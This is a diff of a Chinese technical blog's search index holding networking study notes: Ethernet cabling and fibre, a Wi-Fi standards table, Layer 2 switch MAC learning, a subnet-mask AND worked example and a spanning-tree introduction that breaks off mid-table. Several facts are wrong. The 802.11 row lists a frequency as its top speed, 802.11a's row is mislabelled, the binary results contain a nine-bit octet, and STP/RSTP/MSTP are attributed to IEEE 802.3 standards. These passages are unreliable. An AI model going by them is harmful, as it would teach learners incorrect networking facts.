+<h3 id="常见以太网传输介质-——-双绞线"><a href="#常见以太网传输介质-——-双绞线" class="headerlink" title="常见以太网传输介质 —— 双绞线"></a>常见以太网传输介质 —— 双绞线</h3><ul>
+<li>双绞线是综合布线中最常用的传输介质</li>
+<li>通过4对互相绝缘的导线两两互绞，抵消电磁干扰 </li>
+<li>线缆根据屏蔽性分类：<ul>
+<li>屏蔽双绞线STP：减少辐射，防窃听，防干扰</li>
+<li>非屏蔽双绞线UTP：成本低，直径小，易安装</li>
+</ul>
+</li>
+<li>按照频率和信噪比分类： <ul>
+<li>五类：成本低，适用100Mbps </li>
+<li>超五类：衰减小，适用1Gbps </li>
+<li>六类：衰减小，支持1Gbps </li>
+<li>超六类：支持10Gbps</li>
+</ul>
+</li>
+<li>双绞线传输速率为100Mbps~10Gbps </li>
+<li>双绞线传输距离最远100米，超过会有衰减</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094650.png" alt="8" loading="lazy"></p>
+<h3 id="双绞线线序"><a href="#双绞线线序" class="headerlink" title="双绞线线序"></a>双绞线线序</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094658.png" alt="9" loading="lazy"></p>
+<h3 id="常见以太网传输介质-——-光纤"><a href="#常见以太网传输介质-——-光纤" class="headerlink" title="常见以太网传输介质 —— 光纤"></a>常见以太网传输介质 —— 光纤</h3><ul>
+<li>光纤的种类很多，根据用途不同，所需要的功能和性能也有所差异<ul>
+<li>优点：抗干扰性强，传播损耗低，传输速率高</li>
+<li>缺点：相比双绞线，光纤较脆弱，对实施环境要求高</li>
+</ul>
+</li>
+<li>光模块按传输模式分为：<ul>
+<li>单模：不可见光，传输距离远 </li>
+<li>多模：可见光，传输距离相对较近</li>
+</ul>
+</li>
+<li>正常来说，多模模块需要用多模光纤，单模模块需要单模光纤。若是单模模块使用多模尾纤是可以的，但 是多模模块是不能使用单模尾纤</li>
+<li>锐捷的光传输速率已经能达到100G，支持型号详见官网</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094713.png" alt="10" loading="lazy"></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094716.png" alt="11" loading="lazy"></p>
+<h3 id="常见以太网传输介质-——-无线"><a href="#常见以太网传输介质-——-无线" class="headerlink" title="常见以太网传输介质 —— 无线"></a>常见以太网传输介质 —— 无线</h3><ul>
+<li>无线局域网使用的802.11协议也是以太网，传输介质是“空气”（空间）</li>
+<li>目前主流的协议有802.11n与802.11ac</li>
+<li>无线网络中使用CSMA&#x2F;CA解决冲突问题</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>协议</th>
+<th>发布日期</th>
+<th>频带</th>
+<th>最大传输速度</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>802.11</td>
+<td>1997</td>
+<td>2.4-2.5 GHz</td>
+<td>2.4-2.5 GHz</td>
+</tr>
+<tr>
+<td>2.4-2.5 GHz</td>
+<td>1999</td>
+<td>5.15-5.35&#x2F;5.47-5.725&#x2F;5.725-5.875 GHz</td>
+<td>54 Mbps</td>
+</tr>
+<tr>
+<td>802.11b</td>
+<td>1999</td>
+<td>2.4-2.5 GHz</td>
+<td>11 Mbps</td>
+</tr>
+<tr>
+<td>802.11g</td>
+<td>2003</td>
+<td>2.4-2.5 GHz</td>
+<td>54 Mbps</td>
+</tr>
+<tr>
+<td>802.11n</td>
+<td>2009</td>
+<td>2.4GHz或者5GHz</td>
+<td>600 Mbps (40MHz*4 MIMO)</td>
+</tr>
+<tr>
+<td>802.11ac</td>
+<td>2011.2</td>
+<td>5GHz</td>
+<td>433Mbps，867Mbps， 1.73 Gbps, 3.47 Gbps,6.93 Gbps</td>
+</tr>
+<tr>
+<td>802.11ad</td>
+<td>2012.12</td>
+<td>60GHz</td>
+<td>up to 7Gbps</td>
+</tr>
+<tr>
+<td>802.11ax</td>
+<td>2015.5</td>
+<td>5GHz</td>
+<td>10Gbps</td>
+</tr>
+</tbody></table>
+<h2 id="二层交换机工作原理"><a href="#二层交换机工作原理" class="headerlink" title="二层交换机工作原理"></a>二层交换机工作原理</h2><h3 id="以太网交换机"><a href="#以太网交换机" class="headerlink" title="以太网交换机"></a>以太网交换机</h3><ul>
+<li>早期的以太网使用集线器（HUB）实现终端的互联，但无法分割冲突域，需要使用CSMA&#x2F;CD，传输效率 低下</li>
+<li>现代的以太网大规模普及交换机（Switch），交换机可以分割冲突域</li>
+<li>交换机每个接口都支持全双工或者半双工，以及不同的速率</li>
+<li>园区网络通过以太网交换机将大量终端联入网络</li>
+<li>以太网交换机需要维护一张重要表项——MAC地址表，并通过MAC地址进行数据帧的转发</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094723.png" alt="12" loading="lazy"></p>
+<h3 id="二层交换机工作原理-1"><a href="#二层交换机工作原理-1" class="headerlink" title="二层交换机工作原理"></a>二层交换机工作原理</h3><ul>
+<li>二层交换机根据MAC地址，选择性地将帧从接收端口转发到连接目的节点的端口 <ul>
+<li>学习记录：记录源MAC地址和接收端口的对应关系，构建MAC地址表 </li>
+<li>查表转发：交换机收到一个数据帧后，读取该数据帧的目的MAC，并查看MAC地址表 <ul>
+<li>根据查表结果，交换机总共有3种转发行为</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094728.png" alt="13" loading="lazy"></p>
+<h3 id="MAC地址表的建立"><a href="#MAC地址表的建立" class="headerlink" title="MAC地址表的建立"></a>MAC地址表的建立</h3><ul>
+<li>交换机刚启动时，MAC地址表内无表项</li>
+<li>PC1发出数据帧，交换机将PC1帧中的源MAC与接收端口关联起来 </li>
+<li>交换机将PC1的数据帧从其他端口转发出去（接收到帧的端口F0&#x2F;1除外）</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094731.png" alt="14" loading="lazy"></p>
+<h3 id="MAC地址表的建立-1"><a href="#MAC地址表的建立-1" class="headerlink" title="MAC地址表的建立"></a>MAC地址表的建立</h3><ul>
+<li>PC2、PC3回应数据帧</li>
+<li>交换机把收到的帧的源MAC与接收到这个帧的端口关联起来</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094735.png" alt="15" loading="lazy"></p>
+<h3 id="MAC地址表的维护"><a href="#MAC地址表的维护" class="headerlink" title="MAC地址表的维护"></a>MAC地址表的维护</h3><ul>
+<li>MAC地址的维护与老化<ul>
+<li>当交换机的接口DOWN掉后，与该接口相关的MAC地址都会被清除</li>
+<li>当PC一段时间内（MAC地址的老化时间默认5分钟）没有发送任何报文时，交换机会将该PC的MAC地址表项 自动删除</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094739.png" alt="16" loading="lazy"></p>
+<h3 id="交换机数据帧的单播转发"><a href="#交换机数据帧的单播转发" class="headerlink" title="交换机数据帧的单播转发"></a>交换机数据帧的单播转发</h3><ul>
+<li>PC1向PC2发送单播帧</li>
+<li>交换机根据帧中目的MAC地址，从相应端口F0&#x2F;2发送出去</li>
+<li>交换机不在其他端口转发此单播帧</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094743.png" alt="17" loading="lazy"></p>
+<h3 id="交换机数据帧的泛洪转发"><a href="#交换机数据帧的泛洪转发" class="headerlink" title="交换机数据帧的泛洪转发"></a>交换机数据帧的泛洪转发</h3><ul>
+<li>目标MAC是广播、组播、未知单播帧时，交换机将进行泛洪转发 </li>
+<li>从除接收端口之外的所有其他端口发送出去</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094746.png" alt="18" loading="lazy"></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>锐捷</category>
+      </categories>
+      <tags>
+        <tag>锐捷</tag>
       </tags>
   </entry>
   <entry>
@@ -4065,6 +5146,44 @@ switchport trunk allowed vlan only 10,20,30</code></pre>
       </tags>
   </entry>
   <entry>
+    <title>如何判断两台主机IP是否在同一网段</title>
+    <url>/posts/63b0beec/</url>
+    <content><![CDATA[<h2 id="什么是子网掩码"><a href="#什么是子网掩码" class="headerlink" title="什么是子网掩码"></a>什么是子网掩码</h2><p>子网掩码也称为网络掩码，地址掩码和子网遮罩。 它用于指示IP地址的哪些位标识主机所在的子网，哪些位标识为主机的位掩码。 子网掩码不能单独存在，必须与IP地址一起使用。 子网掩码仅具有一项功能，即将IP地址分为两部分，即网络地址和主机地址。子网掩码是一个32位地址，用于屏蔽IP地址的一部分，以区分网络ID和主机ID，并指示IP地址是在局域网上还是在广域网上。</p>
+<h2 id="子网掩码的功能"><a href="#子网掩码的功能" class="headerlink" title="子网掩码的功能"></a>子网掩码的功能</h2><p>子网掩码是一个32位地址，这是一种与IP地址结合使用的技术。 它具有两个主要功能。 一种是屏蔽IP地址的一部分，以区分网络ID和主机ID，并指示IP地址是在局域网上还是在远程网络上。 第二个是将大型IP网络划分为若干个小型子网。</p>
+<p>子网的使用是为了减少IP的浪费。 因为随着Internet的发展，创建了越来越多的网络，有些网络多达数百个，而有些只有少数，这浪费了大量IP地址，因此必须划分子网。 使用子网可以提高网络应用程序的效率。</p>
+<p>通过计算机的子网掩码判断两台计算机是否属于同一网段的方法是将计算机的十进制IP地址和子网掩码转换为二进制形式，然后执行二进制AND计算（全1则得1，不全1则得0）。 如果结果相同，则两台计算机属于同一网段。</p>
+<h2 id="如何根据掩码来确定IP地址网段"><a href="#如何根据掩码来确定IP地址网段" class="headerlink" title="如何根据掩码来确定IP地址网段"></a>如何根据掩码来确定IP地址网段</h2><p>A主机：IP地址：192.168.1.10 	  	子网掩码：255.255.255.192 	(掩码位26)</p>
+<p>B主句：IP地址： 192.168.1.100		子网掩码：255.255.255.192 	(掩码位26)</p>
+<p>C主机：IP地址： 192.168.1.20		   子网掩码：255.255.255.192 	(掩码位26)</p>
+<p>首先将IP地址和子网掩码转为32位二进制数字</p>
+<p>然后在IP地址和子网掩码做与运算</p>
+<p>A主机：</p>
+<p>IP地址：					11000000  ：10101000  ：00000001  ：00001010</p>
+<p>子网掩码：				11111111  ：11111111  ：11111111  ：11000000</p>
+<p>与运算结果：		11000000  ：100101000  ：00000001 ：00000000</p>
+<p>B主机：</p>
+<p>IP地址：					11000000  ：10101000  ：00000001  :    01100100</p>
+<p>子网掩码：				11111111  ：11111111  ：11111111  ：11000000</p>
+<p>与运算结果：		11000000  ：100101000  ：00000001 ：01000000</p>
+<p>C主机：</p>
+<p>IP地址：					11000000  ： 10101000  ：00000001  ：00010100</p>
+<p>子网掩码：				11111111  ：11111111  ：11111111  ：11000000</p>
+<p>与运算结果：		11000000  ：100101000  ：00000001 ：00000000</p>
+<p>判断与运算结果是否相同</p>
+<p>A主机与运算结果	11000000  ：100101000  ：00000001 ：00000000</p>
+<p>B主机与运算结果	11000000  ：100101000  ：00000001 ：01000000</p>
+<p>C主机与运算结果	11000000  ：100101000  ：00000001 ：00000000</p>
+<p>A主机和C主机与运算结果相同，所以A主机C主机在同一网段，B主机没有与AC主机在同一网段</p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>网络基础</category>
+      </categories>
+      <tags>
+        <tag>网络</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>如何彻底关闭Hyper-V</title>
     <url>/posts/8dc48be7/</url>
     <content><![CDATA[<p>许多第三方虚拟化应用程序无法与 Hyper-V同时工作。 受影响的应用程序包括 VMware Workstation 和 VirtualBox。 这些应用程序可能无法启动虚拟机，或者可能回退到较慢的模拟模式。</p>
@@ -4157,44 +5276,6 @@ mountvol X: &#x2F;d</code></pre>
       </categories>
       <tags>
         <tag>windows</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>如何判断两台主机IP是否在同一网段</title>
-    <url>/posts/63b0beec/</url>
-    <content><![CDATA[<h2 id="什么是子网掩码"><a href="#什么是子网掩码" class="headerlink" title="什么是子网掩码"></a>什么是子网掩码</h2><p>子网掩码也称为网络掩码，地址掩码和子网遮罩。 它用于指示IP地址的哪些位标识主机所在的子网，哪些位标识为主机的位掩码。 子网掩码不能单独存在，必须与IP地址一起使用。 子网掩码仅具有一项功能，即将IP地址分为两部分，即网络地址和主机地址。子网掩码是一个32位地址，用于屏蔽IP地址的一部分，以区分网络ID和主机ID，并指示IP地址是在局域网上还是在广域网上。</p>
-<h2 id="子网掩码的功能"><a href="#子网掩码的功能" class="headerlink" title="子网掩码的功能"></a>子网掩码的功能</h2><p>子网掩码是一个32位地址，这是一种与IP地址结合使用的技术。 它具有两个主要功能。 一种是屏蔽IP地址的一部分，以区分网络ID和主机ID，并指示IP地址是在局域网上还是在远程网络上。 第二个是将大型IP网络划分为若干个小型子网。</p>
-<p>子网的使用是为了减少IP的浪费。 因为随着Internet的发展，创建了越来越多的网络，有些网络多达数百个，而有些只有少数，这浪费了大量IP地址，因此必须划分子网。 使用子网可以提高网络应用程序的效率。</p>
-<p>通过计算机的子网掩码判断两台计算机是否属于同一网段的方法是将计算机的十进制IP地址和子网掩码转换为二进制形式，然后执行二进制AND计算（全1则得1，不全1则得0）。 如果结果相同，则两台计算机属于同一网段。</p>
-<h2 id="如何根据掩码来确定IP地址网段"><a href="#如何根据掩码来确定IP地址网段" class="headerlink" title="如何根据掩码来确定IP地址网段"></a>如何根据掩码来确定IP地址网段</h2><p>A主机：IP地址：192.168.1.10 	  	子网掩码：255.255.255.192 	(掩码位26)</p>
-<p>B主句：IP地址： 192.168.1.100		子网掩码：255.255.255.192 	(掩码位26)</p>
-<p>C主机：IP地址： 192.168.1.20		   子网掩码：255.255.255.192 	(掩码位26)</p>
-<p>首先将IP地址和子网掩码转为32位二进制数字</p>
-<p>然后在IP地址和子网掩码做与运算</p>
-<p>A主机：</p>
-<p>IP地址：					11000000  ：10101000  ：00000001  ：00001010</p>
-<p>子网掩码：				11111111  ：11111111  ：11111111  ：11000000</p>
-<p>与运算结果：		11000000  ：100101000  ：00000001 ：00000000</p>
-<p>B主机：</p>
-<p>IP地址：					11000000  ：10101000  ：00000001  :    01100100</p>
-<p>子网掩码：				11111111  ：11111111  ：11111111  ：11000000</p>
-<p>与运算结果：		11000000  ：100101000  ：00000001 ：01000000</p>
-<p>C主机：</p>
-<p>IP地址：					11000000  ： 10101000  ：00000001  ：00010100</p>
-<p>子网掩码：				11111111  ：11111111  ：11111111  ：11000000</p>
-<p>与运算结果：		11000000  ：100101000  ：00000001 ：00000000</p>
-<p>判断与运算结果是否相同</p>
-<p>A主机与运算结果	11000000  ：100101000  ：00000001 ：00000000</p>
-<p>B主机与运算结果	11000000  ：100101000  ：00000001 ：01000000</p>
-<p>C主机与运算结果	11000000  ：100101000  ：00000001 ：00000000</p>
-<p>A主机和C主机与运算结果相同，所以A主机C主机在同一网段，B主机没有与AC主机在同一网段</p>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>网络基础</category>
-      </categories>
-      <tags>
-        <tag>网络</tag>
       </tags>
   </entry>
   <entry>
@@ -4503,231 +5584,313 @@ pip3 install dailycheckin --upgrade -t .</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>二层交换机工作原理</title>
-    <url>/posts/29adaa64/</url>
-    <content><![CDATA[<blockquote>
+    <title>生成树技术原理与应用</title>
+    <url>/posts/9e5e0428/</url>
+    <content><![CDATA[<div class="danger">
+
+
+<blockquote>
 <p> 资料来源<a href="https://talent.ruijie.com.cn/certification/profession/">锐捷</a><br> 非原创</p>
 </blockquote>
 </div>
 
 
 
-
-
-<h2 id="以太网概述"><a href="#以太网概述" class="headerlink" title="以太网概述"></a>以太网概述</h2><h3 id="以太网产生背景"><a href="#以太网产生背景" class="headerlink" title="以太网产生背景"></a>以太网产生背景</h3><ul>
-<li>早期的网络设备之间互相通信，仅能实现单点通信</li>
-<li>同样的物理环境，只能与一台设备进行互联 </li>
-<li>为了提高传输效率，简化网络拓扑，需要一种能够进行多点通信的机制</li>
+<h2 id="生成树协议综述"><a href="#生成树协议综述" class="headerlink" title="生成树协议综述"></a>生成树协议综述</h2><h3 id="环路的现象与危害"><a href="#环路的现象与危害" class="headerlink" title="环路的现象与危害"></a>环路的现象与危害</h3><ul>
+<li>环路的现象 <ul>
+<li>交换机端口指示灯以相同频率快速闪烁 </li>
+<li>交换机MAC地址表震荡 </li>
+<li>交换机因为资源耗尽，登陆操作异常</li>
 </ul>
-<h3 id="以太网的出现"><a href="#以太网的出现" class="headerlink" title="以太网的出现"></a>以太网的出现</h3><ul>
-<li>共享型以太网诞生，其逻辑拓扑是多路访问总线型网络，所有节点共享同一介质 </li>
-<li>一个节点发送的数据能被传输到该网段上所有设备节点 </li>
-<li>但是，任意时刻信道只能传输一路数据 </li>
-<li>每台主机发出的数据可以被其他所有主机所接收</li>
-<li>如果有两台主机同时发送数据，则产生冲突</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094624.png" alt="1" loading="lazy"></p>
-<h3 id="数据发送机制（CSMA-x2F-CD）"><a href="#数据发送机制（CSMA-x2F-CD）" class="headerlink" title="数据发送机制（CSMA&#x2F;CD）"></a>数据发送机制（CSMA&#x2F;CD）</h3><ul>
-<li>使用CSMA&#x2F;CD（带有冲突检测的载波侦听多路访问）机制决定节点如何发送数据<ul>
-<li>先听后发，边发边听，冲突回退</li>
-<li>同一个网段上所有节点处于一个冲突域中，共享带宽，只能工作在半双工模式下</li>
-<li>现代交换网络使用交换机组网，每个接口属于单独冲突域，工作在全双工模式下，CSMA&#x2F;CD机制就不适用了</li>
+</li>
+<li>环路的危害 <ul>
+<li>链路堵塞：广播报文在二层网络中不断泛洪，所有链路都被大量的广播报文充斥 </li>
+<li>主机系统响应迟缓：主机网卡接收到大量广播报文,操作系统调用大量CPU进程资源来识别这些广播报文 </li>
+<li>二层交换机管理缓慢：大量广播报文需要CPU处理，浪费CPU大量资源，对正常的请求无法响应 </li>
+<li>冲击网关设备的CPU：对网关IP地址的ARP请求报文，经过环路的复制转发，不断地发送到网关设备，网关 设备的CPU压力不断增大，甚至崩溃</li>
 </ul>
 </li>
 </ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094622.png" alt="2" loading="lazy"></p>
-<h3 id="MAC-编址"><a href="#MAC-编址" class="headerlink" title="MAC 编址"></a>MAC 编址</h3><ul>
-<li>IEEE 802标准中使用MAC地址作为识别以太网中网络设备硬件地址的唯一标识符 </li>
-<li>MAC地址由48位二进制数组成，通常表示为12个16进制数 </li>
-<li>前24位是组织唯一标识符OUI（厂商识别码），后24位是节点标识符（厂商分配的序列号）</li>
-<li>OUI 相同的所有 MAC 地址的最后 24位必须是唯一的值</li>
+<h3 id="二层冗余网络面临的问题"><a href="#二层冗余网络面临的问题" class="headerlink" title="二层冗余网络面临的问题"></a>二层冗余网络面临的问题</h3><ul>
+<li>在一个VLAN内，广播包向接收端口之外的所有端口洪泛 </li>
+<li>交换机基于工作原理进行：学习记录、查表转发</li>
 </ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094630.png" alt="3" loading="lazy"></p>
-<h3 id="以太网帧及帧类型"><a href="#以太网帧及帧类型" class="headerlink" title="以太网帧及帧类型"></a>以太网帧及帧类型</h3><ul>
-<li>网络层的数据包被加上帧头和帧尾，就构成了可由数据链路层识别的以太网数据帧</li>
-<li>现在最常见的是：Ethernet II、802.3 SAP和SNAP  以太网 Ehternet II 帧格式</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094634.png" alt="4" loading="lazy"></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615144650.png" alt="1" loading="lazy"></p>
 <ul>
-<li><p>“类型”字段的值大于或等于0x0600时，表示上层（网络层）数据使用的协议类型，例如：0x0800表示 IP协议</p>
-</li>
-<li><p>根据以太网帧的目标MAC,可以分为 </p>
+<li>1、SW1学习PC1_MAC，查MAC地址表，无匹配目的MAC的表项，进行泛洪转发 </li>
+<li>2、SW2与SW3接收到数据帧，进行学习源MAC，并进行泛洪转发</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615144650.png" alt="2" loading="lazy"></p>
 <ul>
-<li>单播：广播域中指定节点接收</li>
-<li>广播：MAC地址是全1(即FFFF.FFFF.FFFF)，广播域中所有节点都可以接收</li>
-<li>组播：MAC地址以01开头，只有加入该组的节点才能接收</li>
+<li>3、SW2与SW3互相收到对方的相同帧，进行学习源MAC，将会把PC1_MAC重新关联接口 </li>
+<li>4、SW1根据接收到G0&#x2F;1与G0&#x2F;2的相同帧，按先后顺序进行学习与泛洪（MAC地址表不稳定） </li>
+<li>5、SW2与SW3又会收到同样的帧，同理循环……</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615144655.png" alt="3" loading="lazy"></p>
+<h3 id="二层环路解决方案"><a href="#二层环路解决方案" class="headerlink" title="二层环路解决方案"></a>二层环路解决方案</h3><ul>
+<li>在交换机上部署生成树协议，逻辑阻塞环路接口 </li>
+<li>当发生物理故障时，冗余链路可以恢复正常转发</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615144659.png" alt="4" loading="lazy"></p>
+<h3 id="STP概述"><a href="#STP概述" class="headerlink" title="STP概述"></a>STP概述</h3><ul>
+<li>STP是怎样的一个协议呢? <ul>
+<li>通过阻断冗余链路，将一个有环路的交换网络修剪成一个无环路的树型拓扑结构 </li>
+<li>在某条活动(active)的链路断开时, 通过激活被阻断的冗余链路重新修剪拓扑结构以恢复网络的连通。</li>
 </ul>
 </li>
 </ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094639.png" alt="5" loading="lazy"></p>
-<h3 id="以太网概述-1"><a href="#以太网概述-1" class="headerlink" title="以太网概述"></a>以太网概述</h3><ul>
-<li>以太网是目前世界上占主导地位的LAN技术 </li>
-<li>以太网由OSI模型的物理层和数据链路层的协议组成</li>
-<li>80年代由DEC、Intel 和 Xerox (DIX) 协会发布了第一个以太网标准，并由IEEE 标准委员会发布了 LAN 标 准<ul>
-<li>IEEE802.3标准定义物理层和数据链路层的MAC子层</li>
-<li>IEEE802.2标准定义了数据链路层的LLC子层</li>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615144704.png" alt="5" loading="lazy"></p>
+<h3 id="生成树综述"><a href="#生成树综述" class="headerlink" title="生成树综述"></a>生成树综述</h3><ul>
+<li>生成树协议的分类 <ul>
+<li>生成树协议的分类，按照产生的时间先后顺序为STP、RSTP、MSTP</li>
+</ul>
+</li>
+<li>生成树协议所遵循的IEEE标准 <ul>
+<li>三种生成树所遵循的IEEE标准分别为：STP-IEEE 802.3D，RSTP-IEEE 802.3W，MSTP-IEEE 802.3S</li>
 </ul>
 </li>
 </ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094643.png" alt="6" loading="lazy"></p>
-<ul>
-<li>以太网定义了第2层协议（链路层协议）和第1层技术（线缆、接口）</li>
-<li>以太网依靠数据链路层的两个单独子层运行<ul>
-<li>逻辑链路控制(LLC)子层处理上层和下层之间的通信。可以由软件（网卡驱动程序）实现 </li>
-<li>介质访问控制(MAC)子层定义了介质访问控制、编址、数据封装。可以由硬件（网卡）实现</li>
-<li>物理层定义了介质上的比特流、接口和拓扑</li>
+<h2 id="STP技术原理和配置"><a href="#STP技术原理和配置" class="headerlink" title="STP技术原理和配置"></a>STP技术原理和配置</h2><h3 id="STP工作原理"><a href="#STP工作原理" class="headerlink" title="STP工作原理"></a>STP工作原理</h3><ul>
+<li>STP技术的实现基于SPA（最短路径树算法 shortest path algorithm）算法，通过SPA在构建无环树形结构 的时候经历四个步骤： <ul>
+<li>选举根桥（Root），根桥是整个无环树形结构的根节点； 	·</li>
+<li>选举根端口（RP），根端口是距离根桥最近的端口； </li>
+<li>选举指定端口（DP），指定端口是设备发出BPDU的接口，每条链路上必定有且只有一个指定端口； </li>
+<li>剩下的端口全部Block掉</li>
 </ul>
 </li>
+<li>实现SPA算法所需要的原始数据，则是通过交换机之间交互BPDU（bridge protocol data unit）报文来 完成的。</li>
 </ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094647.png" alt="7" loading="lazy"></p>
-<h3 id="常见以太网传输介质-——-双绞线"><a href="#常见以太网传输介质-——-双绞线" class="headerlink" title="常见以太网传输介质 —— 双绞线"></a>常见以太网传输介质 —— 双绞线</h3><ul>
-<li>双绞线是综合布线中最常用的传输介质</li>
-<li>通过4对互相绝缘的导线两两互绞，抵消电磁干扰 </li>
-<li>线缆根据屏蔽性分类：<ul>
-<li>屏蔽双绞线STP：减少辐射，防窃听，防干扰</li>
-<li>非屏蔽双绞线UTP：成本低，直径小，易安装</li>
-</ul>
+<h3 id="BPDU报文介绍"><a href="#BPDU报文介绍" class="headerlink" title="BPDU报文介绍"></a>BPDU报文介绍</h3><ul>
+<li><p>BPDU，Bridge Protocol Data Unit网桥协议数据单元。左图为BPDU报文结构简介<img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615144734.png" alt="6" loading="lazy">，右图为真实报文结 构展示</p>
 </li>
-<li>按照频率和信噪比分类： <ul>
-<li>五类：成本低，适用100Mbps </li>
-<li>超五类：衰减小，适用1Gbps </li>
-<li>六类：衰减小，支持1Gbps </li>
-<li>超六类：支持10Gbps</li>
-</ul>
+<li><p>BPDU，Bridge Protocol Data Unit网桥协议数据单元，报文中的各个字段长度以及内容如下：</p>
 </li>
-<li>双绞线传输速率为100Mbps~10Gbps </li>
-<li>双绞线传输距离最远100米，超过会有衰减</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094650.png" alt="8" loading="lazy"></p>
-<h3 id="双绞线线序"><a href="#双绞线线序" class="headerlink" title="双绞线线序"></a>双绞线线序</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094658.png" alt="9" loading="lazy"></p>
-<h3 id="常见以太网传输介质-——-光纤"><a href="#常见以太网传输介质-——-光纤" class="headerlink" title="常见以太网传输介质 —— 光纤"></a>常见以太网传输介质 —— 光纤</h3><ul>
-<li>光纤的种类很多，根据用途不同，所需要的功能和性能也有所差异<ul>
-<li>优点：抗干扰性强，传播损耗低，传输速率高</li>
-<li>缺点：相比双绞线，光纤较脆弱，对实施环境要求高</li>
-</ul>
-</li>
-<li>光模块按传输模式分为：<ul>
-<li>单模：不可见光，传输距离远 </li>
-<li>多模：可见光，传输距离相对较近</li>
-</ul>
-</li>
-<li>正常来说，多模模块需要用多模光纤，单模模块需要单模光纤。若是单模模块使用多模尾纤是可以的，但 是多模模块是不能使用单模尾纤</li>
-<li>锐捷的光传输速率已经能达到100G，支持型号详见官网</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094713.png" alt="10" loading="lazy"></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094716.png" alt="11" loading="lazy"></p>
-<h3 id="常见以太网传输介质-——-无线"><a href="#常见以太网传输介质-——-无线" class="headerlink" title="常见以太网传输介质 —— 无线"></a>常见以太网传输介质 —— 无线</h3><ul>
-<li>无线局域网使用的802.11协议也是以太网，传输介质是“空气”（空间）</li>
-<li>目前主流的协议有802.11n与802.11ac</li>
-<li>无线网络中使用CSMA&#x2F;CA解决冲突问题</li>
 </ul>
 <table>
 <thead>
 <tr>
-<th>协议</th>
-<th>发布日期</th>
-<th>频带</th>
-<th>最大传输速度</th>
+<th>Protocol Identifier</th>
+<th>Version</th>
+<th>Message Type</th>
+<th>Flag</th>
+<th>Root ID</th>
+<th>Root Path Cost</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>802.11</td>
-<td>1997</td>
-<td>2.4-2.5 GHz</td>
-<td>2.4-2.5 GHz</td>
-</tr>
-<tr>
-<td>2.4-2.5 GHz</td>
-<td>1999</td>
-<td>5.15-5.35&#x2F;5.47-5.725&#x2F;5.725-5.875 GHz</td>
-<td>54 Mbps</td>
-</tr>
-<tr>
-<td>802.11b</td>
-<td>1999</td>
-<td>2.4-2.5 GHz</td>
-<td>11 Mbps</td>
-</tr>
-<tr>
-<td>802.11g</td>
-<td>2003</td>
-<td>2.4-2.5 GHz</td>
-<td>54 Mbps</td>
-</tr>
-<tr>
-<td>802.11n</td>
-<td>2009</td>
-<td>2.4GHz或者5GHz</td>
-<td>600 Mbps (40MHz*4 MIMO)</td>
-</tr>
-<tr>
-<td>802.11ac</td>
-<td>2011.2</td>
-<td>5GHz</td>
-<td>433Mbps，867Mbps， 1.73 Gbps, 3.47 Gbps,6.93 Gbps</td>
-</tr>
-<tr>
-<td>802.11ad</td>
-<td>2012.12</td>
-<td>60GHz</td>
-<td>up to 7Gbps</td>
-</tr>
-<tr>
-<td>802.11ax</td>
-<td>2015.5</td>
-<td>5GHz</td>
-<td>10Gbps</td>
+<td>Bridge ID</td>
+<td>Port ID</td>
+<td>Message Age</td>
+<td>Max Age</td>
+<td>Hello Time</td>
